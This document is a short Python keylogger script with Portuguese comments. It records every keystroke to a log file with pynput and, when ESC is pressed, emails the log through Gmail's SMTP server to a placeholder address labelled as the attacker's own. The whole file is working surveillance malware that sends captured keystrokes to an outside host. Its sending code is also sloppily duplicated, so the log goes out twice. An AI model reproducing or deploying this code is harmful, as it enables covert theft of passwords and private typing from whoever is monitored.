import logging
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Configurar o arquivo de log
logging.basicConfig(
  filename="keylog.txt",
  level=logging.INFO,
  format='%(asctime)s: %(message)s'
)


def send_email(log_file):
  # Configurações do servidor de email
  smtp_server = "smtp.gmail.com"  # Use a real SMTP server
  smtp_port = 587  # Common port for SMTP
  smtp_user = "<email>"
  smtp_password = "<criar_senha_app_repo>"

  # Configurações do emailDatadoghq
  from_email = "<email_alvo>"
  to_email = "<email_pessoal"
  subject = "Keylogger Log"

  # Lê o conteúdo do arquivo de log
  with open(log_file, "r") as f:
    log_content = f.read()

  # Cria a mensagem de email
  msg = MIMEMultipart()
  msg["From"] = from_email
  msg["To"] = to_email
  msg["Subject"] = subject
  msg.attach(MIMEText(log_content, "plain"))

  # Envia o email
  with smtplib.SMTP(smtp_server, smtp_port) as server:
    server.starttls()
    server.login(smtp_user, smtp_password)
    server.sendmail(from_email, to_email, msg.as_string())

    # Envia o email
    try:
      with smtplib.SMTP(smtp_server, smtp_port) as server:
        server.starttls()
        server.login(smtp_user, smtp_password)
        server.sendmail(from_email, to_email, msg.as_string())
      print("Email sent successfully")
    except Exception as e:
      print(f"Failed to send email: {e}")


def on_press(key):
  try:
    key_char = key.char
  except AttributeError:
    key_char = str(key)
  logging.info(f'Tecla pressionada: {key_char}')


def on_release(key):
  if key == keyboard.Key.esc:
    print("\nKeylogger finalizado!")
    send_email("keylog.txt")
    return False


print("Keylogger iniciado... Pressione 'ESC' para parar")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()
